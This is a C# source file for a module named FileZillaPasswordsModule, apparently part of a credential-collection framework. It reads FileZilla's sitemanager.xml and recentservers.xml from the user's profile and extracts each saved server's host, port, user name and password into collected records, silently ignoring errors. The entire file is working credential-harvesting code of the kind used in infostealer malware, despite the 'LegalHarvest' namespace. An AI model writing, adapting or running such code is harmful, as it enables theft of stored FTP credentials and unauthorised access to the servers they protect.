using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;

namespace LegalHarvest.Modules
{
    public class FileZillaPasswordsModule : ICollectorModule
    {
        public string ModuleName => "FileZillaPasswords";
        public bool CanExecute()
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            return File.Exists(Path.Combine(appData, "FileZilla", "sitemanager.xml")) ||
                   File.Exists(Path.Combine(appData, "FileZilla", "recentservers.xml"));
        }

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            string[] xmlFiles = { "sitemanager.xml", "recentservers.xml" };
            foreach (string xmlFile in xmlFiles)
            {
                string path = Path.Combine(appData, "FileZilla", xmlFile);
                if (!File.Exists(path)) continue;

                try
                {
                    XmlDocument doc = new XmlDocument();
                    doc.Load(path);
                    foreach (XmlNode server in doc.SelectNodes("//Server"))
                    {
                        string host = server.SelectSingleNode("Host")?.InnerText ?? "";
                        string port = server.SelectSingleNode("Port")?.InnerText ?? "21";
                        string user = server.SelectSingleNode("User")?.InnerText ?? "";
                        string pass = server.SelectSingleNode("Pass")?.InnerText ?? "";
                        items.Add(new CollectedItem { Category = "FileZillaPassword", Name = host, Value = $"{user}:{pass} (port {port})", Timestamp = DateTime.Now });
                    }
                }
                catch { }
            }
            return items;
        }
    }
}
